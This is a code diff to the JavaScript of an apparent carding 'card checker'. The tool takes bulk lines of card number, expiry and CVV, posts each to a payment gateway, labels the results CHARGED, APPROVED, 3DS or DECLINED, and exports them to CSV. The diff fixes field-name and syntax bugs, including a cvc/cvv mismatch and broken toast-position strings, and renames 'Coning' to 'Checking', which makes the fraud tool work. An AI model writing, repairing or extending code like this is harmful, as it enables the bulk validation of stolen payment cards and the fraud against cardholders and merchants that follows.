@@ -380,7 +380,7 @@ async function processCard(card, controller, retryCount = 0) {
         formData.append('card[number]', card.number);
         formData.append('card[exp_month]', card.exp_month);
         formData.append('card[exp_year]', normalizedYear);
-        formData.append('card[cvc]', card.cvc);
+        formData.append('card[cvc]', card.cvv);
 
         $('#statusLog').text(`Processing card: ${card.displayCard}`);
         console.log(`Starting request for card: ${card.displayCard}`);
@@ -392,7 +392,16 @@ async function processCard(card, controller, retryCount = 0) {
             processData: false,
             contentType: false,
             timeout: 300000,
-            signal: controller.signal,
+            xhr: function() {
+                const xhr = new window.XMLHttpRequest();
+                xhr.upload.addEventListener("progress", function(evt) {
+                    if (evt.lengthComputable) {
+                        const percentComplete = evt.loaded / evt.total;
+                        // You could update a progress bar here if needed
+                    }
+                }, false);
+                return xhr;
+            },
             success: function(response) {
                 const parsedResponse = parseGatewayResponse(response);
                 
@@ -457,7 +466,7 @@ async function processCards() {
         .filter(line => /^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/.test(line.trim()))
         .map(line => {
             const [number, exp_month, exp_year, cvc] = line.split('|');
-            return { number, exp_month, exp_year, cvv, displayCard: `${number}|${exp_month}|${exp_year}|${cvc}` };
+            return { number, exp_month, exp_year, cvv: cvc, displayCard: `${number}|${exp_month}|${exp_year}|${cvc}` };
         });
 
     if (validCards.length === 0) {
@@ -1005,7 +1014,7 @@ function initializeActivityUpdates() {
         $('#statusLog').text('Processing stopped.');
         Swal.fire({
             title: 'Stopped!',
-            text: 'Coning has been stopped',
+            text: 'Checking has been stopped',
             icon: 'warning',
             confirmButtonColor: '#ec4899'
         });
@@ -1022,7 +1031,7 @@ function initializeActivityUpdates() {
                     $('#cardInput').val('');
                     updateCardCount();
                     Swal.fire({
-                        toast: true, position: 'timeout: 'top-end', icon: 'success',
+                        toast: true, position: 'top-end', icon: 'success',
                         title: 'Cleared!', showConfirmButton: false, timer: 1500
                     });
                 }
@@ -1042,7 +1051,7 @@ function initializeActivityUpdates() {
         document.getElementById('copyAllBtn').style.display = 'none';
         document.getElementById('clearAllBtn').style.display = 'none';
         Swal.fire({
-            toast: true, position: 'timeout: 'top-end', icon: 'success',
+            toast: true, position: 'top-end', icon: 'success',
             title: 'Cleared!', showConfirmButton: false, timer: 1500
         });
     });
@@ -1061,7 +1070,7 @@ function initializeActivityUpdates() {
         let csvContent = "Card,Status,Response\n";
         allCards.forEach(card => {
             const status = card.response.includes('CHARGED') ? 'CHARGED' :
-                         card.response.includes('APPROVED') ? 'PROVED' :
+                         card.response.includes('APPROVED') ? 'APPROVED' :
                          card.response.includes('3DS') ? '3DS' : 'DECLINED';
             csvContent += `${card.displayCard},${status},${card.response}\n`;
         });
@@ -1074,7 +1083,7 @@ function initializeActivityUpdates() {
         link.click();
         document.body.removeChild(link);
         Swal.fire({
-            toast: true, position: 'timeout: 'top-end', icon: 'success',
+            toast: true, position: 'top-end', icon: 'success',
             title: 'Exported!', showConfirmButton: false, timer: 1500
         });
     });
